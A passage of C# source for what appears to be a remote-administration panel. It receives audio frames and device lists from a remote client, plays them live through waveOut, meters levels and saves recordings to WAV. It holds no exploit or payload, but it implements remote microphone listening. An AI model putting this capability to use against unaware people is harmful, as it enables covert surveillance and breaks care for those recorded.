            _wavStream.Dispose(); _wavStream = null; _wavDataLen = 0;
        }

        void WriteWavFile(Stream output, byte[] pcmData, int sampleRate, int bitsPerSample, int channels)
        {
            int blockAlign = channels * bitsPerSample / 8;
            int byteRate = sampleRate * blockAlign;
            int dataLen = pcmData.Length;

            using var bw = new BinaryWriter(output);
            bw.Write(Encoding.ASCII.GetBytes("RIFF"));
            bw.Write(36 + dataLen);
            bw.Write(Encoding.ASCII.GetBytes("WAVE"));
            bw.Write(Encoding.ASCII.GetBytes("fmt "));
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)channels);
            bw.Write(sampleRate);
            bw.Write(byteRate);
            bw.Write((short)blockAlign);
            bw.Write((short)bitsPerSample);
            bw.Write(Encoding.ASCII.GetBytes("data"));
            bw.Write(dataLen);
            bw.Write(pcmData);
        }

        // === WaveOut playback with proper lifecycle ===

        void EnsureWaveOut(int rate, int bits, int channels)
        {
            lock (_playLock)
            {
                if (_closing) return;

                // If format changed, close and reopen
                if (_waveOutOpen && (_playRate != rate || _playBits != bits || _playChannels != channels))
                    CloseWaveOutInternal();

                if (_waveOutOpen) return;

                _playRate = rate; _playBits = bits; _playChannels = channels;
                var fmt = new WAVEFORMATEX_P
                {
                    wFormatTag = 1,
                    nChannels = (short)channels,
                    nSamplesPerSec = rate,
                    wBitsPerSample = (short)bits,
                    nBlockAlign = (short)(channels * bits / 8),
                    nAvgBytesPerSec = rate * channels * bits / 8,
                    cbSize = 0
                };

                int result = waveOutOpen(out _waveOut, WAVE_MAPPER, ref fmt, _waveOutProc, IntPtr.Zero, CALLBACK_FUNCTION_P);
                if (result == 0)
                {
                    _waveOutOpen = true;
                    _pendingBuffers = 0;
                    Log("WaveOut opened: " + rate + "Hz " + bits + "bit " + channels + "ch");
                }
                else
                {
                    Log("WaveOut open FAILED: error " + result);
                    _waveOut = IntPtr.Zero;
                }
            }
        }

        void CloseWaveOut()
        {
            lock (_playLock) CloseWaveOutInternal();
        }

        void CloseWaveOutInternal()
        {
            if (!_waveOutOpen) return;
            _closing = true;
            try
            {
                // waveOutReset returns all pending buffers via WOM_DONE callbacks
                waveOutReset(_waveOut);
                // Callbacks fire synchronously on some drivers, asynchronously on others.
                // Small sleep to let async callbacks complete.
                Thread.Sleep(100);
                waveOutClose(_waveOut);
            }
            catch { }
            _waveOut = IntPtr.Zero;
            _waveOutOpen = false;
            _pendingBuffers = 0;
            _closing = false;
        }

        void PlayAudio(byte[] pcmData, int rate, int bits, int channels)
        {
            if (!_playback || _disposed || _closing) return;

            // Drop frames if too many are queued — keeps latency bounded
            if (Interlocked.CompareExchange(ref _pendingBuffers, 0, 0) >= MAX_PENDING_BUFFERS)
            {
                Interlocked.Increment(ref _droppedFrames);
                return;
            }

            // Apply software volume scaling
            byte[] scaled = ApplyVolume(pcmData, bits, _volume);

            EnsureWaveOut(rate, bits, channels);

            lock (_playLock)
            {
                if (!_waveOutOpen || _waveOut == IntPtr.Zero || _closing) return;

                try
                {
                    int hdrSize = Marshal.SizeOf(typeof(WAVEHDR_P));

                    IntPtr dataPtr = Marshal.AllocHGlobal(scaled.Length);
                    Marshal.Copy(scaled, 0, dataPtr, scaled.Length);

                    IntPtr hdrPtr = Marshal.AllocHGlobal(hdrSize);
                    var hdr = new WAVEHDR_P
                    {
                        lpData = dataPtr,
                        dwBufferLength = scaled.Length,
                        dwBytesRecorded = 0,
                        dwUser = dataPtr, // store so callback can free
                        dwFlags = 0,
                        dwLoops = 0
                    };
                    Marshal.StructureToPtr(hdr, hdrPtr, false);

                    int prepResult = waveOutPrepareHeader(_waveOut, hdrPtr, hdrSize);
                    if (prepResult != 0)
                    {
                        Marshal.FreeHGlobal(dataPtr);
                        Marshal.FreeHGlobal(hdrPtr);
                        return;
                    }

                    int writeResult = waveOutWrite(_waveOut, hdrPtr, hdrSize);
                    if (writeResult != 0)
                    {
                        waveOutUnprepareHeader(_waveOut, hdrPtr, hdrSize);
                        Marshal.FreeHGlobal(dataPtr);
                        Marshal.FreeHGlobal(hdrPtr);
                        return;
                    }

                    Interlocked.Increment(ref _pendingBuffers);
                }
                catch (Exception ex)
                {
                    Log("PlayAudio error: " + ex.Message);
                }
            }
        }

        byte[] ApplyVolume(byte[] pcm, int bits, float vol)
        {
            if (vol >= 0.99f && vol <= 1.01f) return pcm;

            byte[] result = new byte[pcm.Length];

            if (bits == 16)
            {
                for (int i = 0; i + 1 < pcm.Length; i += 2)
                {
                    short sample = (short)(pcm[i] | (pcm[i + 1] << 8));
                    int scaled = (int)(sample * vol);
                    if (scaled > 32767) scaled = 32767;
                    if (scaled < -32768) scaled = -32768;
                    result[i] = (byte)(scaled & 0xFF);
                    result[i + 1] = (byte)((scaled >> 8) & 0xFF);
                }
            }
            else if (bits == 8)
            {
                for (int i = 0; i < pcm.Length; i++)
                {
                    int sample = pcm[i] - 128;
                    int scaled = (int)(sample * vol) + 128;
                    if (scaled > 255) scaled = 255;
                    if (scaled < 0) scaled = 0;
                    result[i] = (byte)scaled;
                }
            }
            else
            {
                Buffer.BlockCopy(pcm, 0, result, 0, pcm.Length);
            }

            return result;
        }

        void WaveOutCallback(IntPtr handle, int msg, IntPtr instance, IntPtr param1, IntPtr param2)
        {
            if (msg != WOM_DONE) return;

            try
            {
                int hdrSize = Marshal.SizeOf(typeof(WAVEHDR_P));
                var hdr = (WAVEHDR_P)Marshal.PtrToStructure(param1, typeof(WAVEHDR_P));

                // Only unprepare if we're not in the middle of closing
                // (waveOutReset already marks buffers done, but handle may be closing)
                if (!_closing)
                {
                    try { waveOutUnprepareHeader(handle, param1, hdrSize); } catch { }
                }

                if (hdr.dwUser != IntPtr.Zero)
                    Marshal.FreeHGlobal(hdr.dwUser);

                Marshal.FreeHGlobal(param1);

                Interlocked.Decrement(ref _pendingBuffers);
            }
            catch { }
        }

        void UpdateLevel(byte[] pcmData, int bitsPerSample)
        {
            if (_disposed) return;
            double peak = 0;
            if (bitsPerSample == 16 && pcmData.Length >= 2)
            {
                int step = Math.Max(1, pcmData.Length / 2 / 500); // sample at most ~500 points
                for (int i = 0; i + 1 < pcmData.Length; i += step * 2)
                {
                    short s = (short)(pcmData[i] | (pcmData[i + 1] << 8));
                    double a = Math.Abs(s) / 32768.0;
                    if (a > peak) peak = a;
                }
            }
            else if (bitsPerSample == 8 && pcmData.Length >= 1)
            {
                int step = Math.Max(1, pcmData.Length / 500);
                for (int i = 0; i < pcmData.Length; i += step)
                {
                    double a = Math.Abs(pcmData[i] - 128) / 128.0;
                    if (a > peak) peak = a;
                }
            }

            double db = peak > 0 ? 20 * Math.Log10(peak) : -96;
            double pct = peak;

            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                _levelLbl.Text = "Level: " + db.ToString("F0") + " dB";
                double trackW = _levelTrack.ActualWidth;
                if (trackW <= 0) trackW = 200;
                _levelBar.Width = Math.Max(0, Math.Min(trackW, pct * trackW));

                if (pct > 0.9) _levelBar.Background = new SolidColorBrush(C("DangerColor"));
                else if (pct > 0.6) _levelBar.Background = new SolidColorBrush(C("WarningColor"));
                else _levelBar.Background = GnB;
            });
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;

            if (data[0] == 0x30) { HandleAudioFrame(data); return; }

            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                try
                {
                    switch (data[0])
                    {
                        case 0x06: HandleDeviceList(data); break;
                        case 0xFD:
                            if (data.Length > 1) Log("[C] " + Encoding.UTF8.GetString(data, 1, data.Length - 1));
                            break;
                        case 0xFE:
                            if (data.Length > 2)
                            {
                                string m = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[OK] " + m);
                                if (_recording) St("?? LIVE — " + m);
                                else St(m);
                            }
                            break;
                        case 0xFF:
                            if (data.Length > 2)
                            {
                                string m = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[ERR] " + m); St("Error: " + m);
                            }
                            break;
                    }
                }
                catch { }
            });
        }

        void HandleAudioFrame(byte[] d)
        {
            if (d.Length < 9) return;
            int sampleRate = d[1] | (d[2] << 8);
            int bits = d[3];
            int channels = d[4];
            int dataLen = d[5] | (d[6] << 8) | (d[7] << 16) | (d[8] << 24);

            if (sampleRate < 8000 || sampleRate > 48000) return;
            if (bits != 8 && bits != 16) return;
            if (channels < 1 || channels > 2) return;
            if (dataLen <= 0 || 9 + dataLen > d.Length) return;

            byte[] pcm = new byte[dataLen];
            Buffer.BlockCopy(d, 9, pcm, 0, dataLen);

            _totalBytes += dataLen;
            _bytesSinceLastRate += dataLen;

            var now = DateTime.UtcNow;
            if ((now - _lastDataRate).TotalSeconds >= 1)
            {
                double kbps = _bytesSinceLastRate * 8.0 / 1000.0 / (now - _lastDataRate).TotalSeconds;
                _bytesSinceLastRate = 0; _lastDataRate = now;
                double capturedKbps = kbps;
                long capturedTotal = _totalBytes;
                int pending = _pendingBuffers;
                long dropped = _droppedFrames;
                Dispatcher.BeginInvoke(() =>
                {
                    if (!_disposed)
                        _dataRateLbl.Text = capturedKbps.ToString("F0") + " kbps | " + (capturedTotal / 1024).ToString("N0") + " KB | buf:" + pending + " drop:" + dropped;
                });
            }

            UpdateLevel(pcm, bits);

            // Play live audio
            if (_playback) PlayAudio(pcm, sampleRate, bits, channels);

            // Save to WAV buffer if recording to file
            if (_savingToFile && _wavStream != null)
            {
                // Capture format from first frame
                if (_wavSaveRate == 0)
                {
                    _wavSaveRate = sampleRate;
                    _wavSaveBits = bits;
                    _wavSaveChannels = channels;
                }
                _wavStream.Write(pcm, 0, pcm.Length);
                _wavDataLen += pcm.Length;
            }
        }

        void HandleDeviceList(byte[] d)
        {
            var info = Encoding.UTF8.GetString(d, 1, d.Length - 1);
            _suppress = true; _devSel.Items.Clear();
            int idx = 0;
            foreach (var line in info.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                var p = line.Split('|');
                string label;
                if (p.Length >= 2)
                    label = "[" + p[0] + "] " + p[1];
                else
                    label = line;
                _devSel.Items.Add(MakeComboItem(label));
                idx++;
            }
            if (_devSel.Items.Count > 0) _devSel.SelectedIndex = 0;
            _suppress = false;
            St(idx + " audio device(s) found");
            Log("Received " + idx + " device(s)");
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            if (_recording)
                try { _context.SendToClient(new byte[] { 0x02 }).Wait(1000); } catch { }
            CloseWaveOut();
            _wavStream?.Dispose();
        }
    }
}